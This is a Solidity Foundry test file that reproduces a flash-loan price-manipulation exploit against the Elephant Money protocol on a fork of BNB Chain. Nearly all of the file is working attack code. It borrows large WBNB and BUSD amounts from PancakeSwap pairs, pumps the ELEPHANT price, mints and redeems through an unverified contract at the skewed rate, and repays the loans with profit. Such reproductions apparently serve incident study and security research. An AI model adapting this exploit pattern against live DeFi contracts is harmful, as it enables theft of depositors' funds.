// SPDX-License-Identifier: UNLICENSED
//Credit: W2Ning
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

    address public BUSD_USDT_Pair = 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00;

    address public elephant_wbnb_Pair = 0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1;

    address public BUSDT_WBNB_Pair = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;

    address[] path_1 = [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688];

    address[] path_2 = [0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c];

    address[] path_3 = [0xdd325C38b12903B727D16961e61333f4871A70E0, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56];

    address[] path_4 = [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56];

    IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    IERC20 elephant = IERC20(0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688);

    IERC20 Trunk = IERC20(0xdd325C38b12903B727D16961e61333f4871A70E0);

    IRouter router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    InotVerified not_verified = InotVerified(0xD520a3B47E42a1063617A9b6273B206a07bDf834);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    constructor() {
        cheats.createSelectFork("bsc", 16_886_438); // fork bsc block number 16886438

        elephant.approve(address(router), type(uint256).max);

        Trunk.approve(address(router), type(uint256).max);

        Trunk.approve(address(not_verified), type(uint256).max);

        busd.approve(address(not_verified), type(uint256).max);

        wbnb.approve(address(router), type(uint256).max);
    }

    function testExploit() public {
        IPancakePair(BUSDT_WBNB_Pair).swap(0, 100_000 ether, address(this), "0x00");
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        sender;
        data;
        amount0;
        amount1;

        if (msg.sender == BUSDT_WBNB_Pair) {
            IPancakePair(BUSD_USDT_Pair).swap(0, 90_000_000 ether, address(this), "0x00");
        } else {
            attack();
        }
    }

    function attack() public {
        wbnb.withdraw(100_000 ether);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 100_000 ether}(
            0, path_1, address(this), block.timestamp
        );

        uint256 balance_elephant = elephant.balanceOf(address(this));

        emit log_named_uint("The elephant after swapping", balance_elephant / 1e9);

        not_verified.mint(90_000_000 ether);

        uint256 balance_Trunk = Trunk.balanceOf(address(this));

        emit log_named_uint("The Trunk after minting", balance_Trunk / 1e18);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            balance_elephant, 0, path_2, address(this), block.timestamp
        );

        emit log_named_uint("The WBNB Balance after swaping", wbnb.balanceOf(address(this)) / 1e18);

        balance_Trunk = Trunk.balanceOf(address(this));

        not_verified.redeem(balance_Trunk);

        emit log_named_uint("The BUSD after redeeming", busd.balanceOf(address(this)) / 1e18);

        uint256 b3 = elephant.balanceOf(address(this));

        emit log_named_uint("The elephant after redeeming", b3 / 1e9);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(b3, 0, path_2, address(this), block.timestamp);

        emit log_named_uint("The WBNB Balance before paying back", wbnb.balanceOf(address(this)) / 1e18);

        wbnb.transfer(BUSDT_WBNB_Pair, 100_300 ether);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnb.balanceOf(address(this)), 0, path_4, address(this), block.timestamp
        );

        emit log_named_uint("The BUSD before paying back", busd.balanceOf(address(this)) / 1e18);

        busd.transfer(BUSD_USDT_Pair, 90_300_000 ether);

        emit log_named_uint("The BUSD after paying back", busd.balanceOf(address(this)) / 1e18);
    }

    receive() external payable {}
}
